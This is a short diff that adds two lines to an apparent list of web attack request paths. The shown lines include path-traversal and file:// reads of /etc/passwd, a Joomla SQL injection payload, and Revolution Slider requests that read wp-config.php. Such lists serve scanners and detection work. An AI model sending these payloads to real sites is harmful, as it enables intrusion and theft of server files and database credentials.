@@ -31,3 +31,5 @@
 /..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
 /index.php?option=com_contenthistory&view=history&list[ordering]=&item_id=1&type_id=1&list[select]=updatexml(0x23,concat(1,md5(8888)),1)
 /wp-content/themes/diarise/download.php?calendar=file:///etc/passwd
+/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php
+/blog/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php
